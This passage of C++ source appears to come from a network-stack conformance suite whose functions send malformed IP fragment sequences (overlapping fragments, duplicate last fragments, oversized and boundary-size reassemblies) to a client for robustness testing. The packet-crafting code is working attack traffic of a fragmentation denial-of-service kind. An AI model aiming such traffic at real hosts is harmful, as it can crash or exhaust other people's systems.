			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
			
			// Initialize buffer for the remaining packet data
			memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);

			if(i == 0)
			{
				CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(1600);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMultipleLastFragmentAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 100-part fragmented datagram
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMultipleLastFragmentAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 3; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
			pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(48);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				break;
			case 1:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(4);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(2);
				break;
			}
			
			
			// Initialize buffer for the remaining packet data
			memset(PayloadBuffer, (int)'a' +  (int) i, sizeof(PayloadBuffer));
			pIPPacket->SetUserBuffer(PayloadBuffer, (i == 0) ? 8 : 16, TRUE);

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragOverlappingFragmentsAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends 7 fragments containing overlapping data
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragOverlappingFragmentsAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 7; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(40);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'a', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			case 1:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(1);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'a', 8);
				memset(PayloadBuffer + 8, (int)'b', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			case 2:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(2);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
				memset(PayloadBuffer, (int)'b', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			case 3:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(2);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'b', 8);
				memset(PayloadBuffer + 8, (int)'c', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			case 4:
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(3);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
				memset(PayloadBuffer, (int)'c', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			case 5:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(3);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
				memset(PayloadBuffer, (int)'c', 8);
				memset(PayloadBuffer + 8, (int)'d', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(4);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 8);
				memset(PayloadBuffer, (int)'d', 8);
				pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
				break;
			}
			
			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMaxDatagramSizeAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends a 64 1K (one is 1K - 1) fragments of a datagram
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMaxDatagramSizeAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 64; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 1);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			// Always indicate that there are more packets
			pIPPacket->IPHeader.SetFlag((i == 63) ? 0 : IPFLAG_MOREFRAGS);
			pIPPacket->IPHeader.SetFragOffset(i * 128);
			
			// Manually calculate length.  We're really adding extra data.
			pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);

			switch(i)
			{
			case 0:
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1016, TRUE);
				break;
			case 63:
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1023);
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1023, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1024, TRUE);
				break;
			}


			if(i == 0)
			{
				CUDPPacket *pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(64 * 1024 - 1);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMaxReassemblySizeAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends fragments of a 2K datagram (exactly default max reassembly size)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMaxReassemblySizeAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1024];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 2);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(2 * 1024);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1016, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(128);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1024, TRUE);
				break;
			}

			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragAboveMaxReassemblySizeAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends fragments of a 2K + 1 datagram (one above default max reassembly size)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragAboveMaxReassemblySizeAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[1025];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);

	for(INT i = 0; i < 2; ++i)
	{
		// Watch for SPARTA exceptions
		try
		{
			// Create and initialize the IP packet
			pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);

			// Fill in the IP header fields
			pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
			pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
			pIPPacket->MacHeader.SetProtocolType(0x800);
			pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
			pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
			pIPPacket->IPHeader.SetID(IPID_DEFAULT + 3);
			pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
			pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
			pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
			pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
			pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
			pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
			
			switch(i)
			{
			case 0:
				pUDPPacket = (CUDPPacket *) pIPPacket;
				pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
				pUDPPacket->UDPHeader.SetDestPort(UDPPORT_DEST);
				pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
				pUDPPacket->UDPHeader.SetLength(2 * 1024 + 1);
				pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
				pUDPPacket->UDPHeader.SetChecksum(0);
				
				pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
				pIPPacket->IPHeader.SetFragOffset(0);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1024);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1016, TRUE);
				break;
			default:
				pIPPacket->IPHeader.SetFlag(0);
				pIPPacket->IPHeader.SetFragOffset(128);
				
				// Manually calculate length.  We're really adding extra data.
				pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
				pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 1025);
				
				// Initialize buffer for the remaining packet data
				memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
				pIPPacket->SetUserBuffer(PayloadBuffer, 1025, TRUE);
				break;
			}


			// Send the packet
			pInterface->Send(*pIPPacket);
		}
		catch(CSpartaException *Ex)
		{
			delete Ex;
		}

		// Release the packet
		if(pIPPacket)
		{
			delete pIPPacket;
			pIPPacket = NULL;
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragMaxSimulReassemblyAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends fragments of 4 datagrams before completing
// any of them (exactly the maximum number of simultaneous reassemblies)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragMaxSimulReassemblyAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
	
	for(INT i = 0; i < 2; ++i)
	{
		for(INT j = 0; j < SIM_REASM_MAX; ++j)			
		{
			// Watch for SPARTA exceptions
			try
			{
				// Create and initialize the IP packet
				pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);
				
				// Fill in the IP header fields
				pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
				pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
				pIPPacket->MacHeader.SetProtocolType(0x800);
				pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
				pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
				pIPPacket->IPHeader.SetID(IPID_DEFAULT + j);
				pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
				pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
				pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
				pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
				pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
				pIPPacket->IPHeader.SetAutoCalcChecksum(ON);

				switch(i)
				{
				case 0:
					pUDPPacket = (CUDPPacket *) pIPPacket;
					pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
					pUDPPacket->UDPHeader.SetDestPort((UDPPORT_DEST + j + MAX_SIMUL_PORT_OFFSET) % MAXWORD + 1);
					pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
					pUDPPacket->UDPHeader.SetLength(32);
					pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
					pUDPPacket->UDPHeader.SetChecksum(0);
					
					pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
					pIPPacket->IPHeader.SetFragOffset(0);
					
					// Manually calculate length.  We're really adding extra data.
					pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
					pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
					
					// Initialize buffer for the remaining packet data
					memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
					pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
					break;
				default:
					pIPPacket->IPHeader.SetFlag(0);
					pIPPacket->IPHeader.SetFragOffset(2);
					
					// Manually calculate length.  We're really adding extra data.
					pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
					pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
					
					// Initialize buffer for the remaining packet data
					memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
					pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
					break;
				}
				
				
				// Send the packet
				pInterface->Send(*pIPPacket);
			}
			catch(CSpartaException *Ex)
			{
				delete Ex;
			}
			
			// Release the packet
			if(pIPPacket)
			{
				delete pIPPacket;
				pIPPacket = NULL;
			}
		}
	}

	return TRUE;
}

//==================================================================================
// IPFragAboveMaxSimulReassemblyAttack
//----------------------------------------------------------------------------------
//
// Description: Test where server sends fragments of 5 datagrams before completing
// any of them (one above the maximum number of simultaneous reassemblies)
//
// Arguments:
//	DWORD			FromAddr		Address of user that requested the test
//	PSESSION_INFO	pSessionInfo	Context indicating which session this belongs to
//
// Returns:
//	TRUE on success, FALSE otherwise
//==================================================================================
BOOL IPFragAboveMaxSimulReassemblyAttack(CInterface *pInterface, CHAR *szDestMac)
{
	CUDPPacket *pUDPPacket = NULL;
	CIPPacket *pIPPacket = NULL;
	CHAR szFormattedDestMac[18];
	BYTE PayloadBuffer[16];

	// Format the client Mac address string
	sprintf(szFormattedDestMac, "%c%c-%c%c-%c%c-%c%c-%c%c-%c%c",
		szDestMac[0], szDestMac[1], szDestMac[2], szDestMac[3], szDestMac[4], szDestMac[5],
		szDestMac[6], szDestMac[7], szDestMac[8], szDestMac[9], szDestMac[10], szDestMac[11]);

	// Create a destination mac address from the address reported by the client
	MAC_MEDIA_TYPE MediaType = pInterface->GetMediaType();
	CMacAddress ClientMacAddr(MediaType, szFormattedDestMac);
	
	for(INT i = 0; i < 2; ++i)
	{
		for(INT j = 0; j < SIM_REASM_MAX + 1; ++j)			
		{
			// Watch for SPARTA exceptions
			try
			{
				// Create and initialize the IP packet
				pIPPacket = (i == 0) ? new CUDPPacket(MediaType) : new CIPPacket(MediaType);
				
				// Fill in the IP header fields
				pIPPacket->MacHeader.SetDestAddress(ClientMacAddr);
				pIPPacket->MacHeader.SetSrcAddress(*pInterface->GetMediaAddress());
				pIPPacket->MacHeader.SetProtocolType(0x800);
				pIPPacket->IPHeader.SetVersion(IPVERSION_DEFAULT);
				pIPPacket->IPHeader.SetTOS(IPTOS_NORMAL);
				pIPPacket->IPHeader.SetID(IPID_DEFAULT + j);
				pIPPacket->IPHeader.SetTTL(IPTTL_DEFAULT);
				pIPPacket->IPHeader.SetProtocolType(PROTOCOL_UDP);
				pIPPacket->IPHeader.SetDestAddr(IPADDR_DEST);
				pIPPacket->IPHeader.SetSrcAddr(IPADDR_SOURCE);
				pIPPacket->IPHeader.SetAutoCalcHeaderLength(ON);
				pIPPacket->IPHeader.SetAutoCalcChecksum(ON);
			
				switch(i)
				{
				case 0:
					pUDPPacket = (CUDPPacket *) pIPPacket;
					pUDPPacket->UDPHeader.SetSrcPort(UDPPORT_SOURCE);
					pUDPPacket->UDPHeader.SetDestPort((UDPPORT_DEST + j + ABOVE_MAX_SIMUL_PORT_OFFSET) % MAXWORD + 1);
					pUDPPacket->UDPHeader.SetAutoCalcLength(OFF);
					pUDPPacket->UDPHeader.SetLength(32);
					pUDPPacket->UDPHeader.SetAutoCalcChecksum(OFF);
					pUDPPacket->UDPHeader.SetChecksum(0);
					
					pIPPacket->IPHeader.SetFlag(IPFLAG_MOREFRAGS);
					pIPPacket->IPHeader.SetFragOffset(0);
					
					// Manually calculate length.  We're really adding extra data.
					pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
					pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
					
					// Initialize buffer for the remaining packet data
					memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
					pIPPacket->SetUserBuffer(PayloadBuffer, 8, TRUE);
					break;
				default:
					pIPPacket->IPHeader.SetFlag(0);
					pIPPacket->IPHeader.SetFragOffset(2);
					
					// Manually calculate length.  We're really adding extra data.
					pIPPacket->IPHeader.SetAutoCalcDatagramLength(OFF);
					pIPPacket->IPHeader.SetDatagramLength(IPHEADER_SIZE + 16);
					
					// Initialize buffer for the remaining packet data
					memset(PayloadBuffer, (int)'a' +  (int) (i % ('z' - 'a')), sizeof(PayloadBuffer));
					pIPPacket->SetUserBuffer(PayloadBuffer, 16, TRUE);
					break;
				}
				
				
				// Send the packet
				pInterface->Send(*pIPPacket);
			}
			catch(CSpartaException *Ex)
			{
				delete Ex;
			}
			
			// Release the packet
			if(pIPPacket)
			{
				delete pIPPacket;
